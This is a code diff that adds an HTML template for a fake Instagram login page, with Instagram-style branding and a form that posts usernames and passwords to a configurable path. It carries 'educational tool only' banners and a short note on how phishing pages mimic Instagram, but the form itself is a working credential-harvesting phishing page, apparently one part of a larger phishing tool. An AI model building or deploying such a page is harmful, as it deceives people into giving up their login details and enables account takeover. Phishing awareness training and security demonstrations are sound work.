@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .instagram-gradient {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+        }
+        .warning {
+            background-color: #ffebee;
+            border: 2px solid #f44336;
+            padding: 15px;
+            margin: 20px;
+            border-radius: 5px;
+            color: #c62828;
+            text-align: center;
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <div class="warning">
+        <strong>EDUCATIONAL TOOL ONLY:</strong> {{ warning }}
+    </div>
+
+    <div class="min-h-screen flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
+        <div class="max-w-md w-full space-y-8">
+            <div>
+                <h2 class="mt-6 text-center text-3xl font-extrabold text-gray-900">
+                    Instagram
+                </h2>
+                <p class="mt-2 text-center text-sm text-gray-600">
+                    Educational demonstration only
+                </p>
+            </div>
+            
+            <form class="mt-8 space-y-6" action="/{{ custom_path }}/submit" method="POST">
+                <div class="rounded-md shadow-sm -space-y-px">
+                    <div>
+                        <input name="username" type="text" required class="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm" placeholder="Username, email or mobile number">
+                    </div>
+                    <div>
+                        <input name="password" type="password" required class="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm" placeholder="Password">
+                    </div>
+                </div>
+
+                <div>
+                    <button type="submit" class="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white instagram-gradient hover:opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
+                        Log In
+                    </button>
+                </div>
+                
+                <div class="text-center">
+                    <a href="#" class="font-medium text-blue-600 hover:text-blue-500">
+                        Forgot password?
+                    </a>
+                </div>
+            </form>
+
+            <div class="bg-blue-50 p-4 rounded-lg mt-8">
+                <h4 class="font-semibold text-blue-800">Educational Purpose:</h4>
+                <p class="text-sm text-blue-700 mt-2">
+                    This demonstrates how phishing pages mimic Instagram's login form.
+                    Always verify URLs before entering credentials.
+                </p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
